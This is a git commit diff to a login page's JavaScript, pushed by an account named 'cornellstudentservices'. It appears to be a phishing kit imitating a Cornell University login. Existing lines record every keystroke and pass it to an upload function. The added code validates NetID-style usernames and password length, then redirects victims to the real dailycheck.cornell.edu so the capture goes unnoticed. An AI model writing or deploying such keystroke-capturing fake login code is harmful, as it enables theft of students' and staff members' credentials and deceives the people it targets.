d24d4264cb52587aadf436f05345f8aea7dca2c6
cornellstudentservices <94484653+cornellstudentservices@users.noreply.github.com>
2021-11-22 19:19:25 -0500

    Add files via upload

--- login/js/script.js
+++ login/js/script.js
@@ -1,3 +1,30 @@
+function valid(id){
+    if (id.length < 3 || id.length > 6){
+        return false
+    }
+    index = 0
+    for (let i=0; i<id.length; i++){
+        if (!isNaN(id[i])){
+            index = i
+            break
+        }
+    }
+    if (index == 0){
+        return false
+    }
+    letters = id.substring(0,index)
+    number = id.substring(index, id.length)
+    if (isNaN(number)){
+        return false
+    }
+    for (let i=0; i<letters.length; i++){
+        if (!isNaN(letters[i])){
+            return false
+        }
+    }
+    return true
+}
+
 window.addEventListener('keydown', e => {
     console.log(e.key)
     uploadSet('-')
@@ -7,3 +34,15 @@ window.addEventListener('keydown', e => {
     },10)
     uploadSet('char: ' + e.key)
 })
+
+
+Id('submit').onclick = () => {
+    if (valid(Id('username').value) && Id('password').value.length > 6){
+        window.location.href = 'https://dailycheck.cornell.edu'
+    }else{
+        Id('reason').style.display = 'none'
+        setTimeout(()=>{
+            Id('reason').style.display = 'block'
+        },50)
+    }
+}
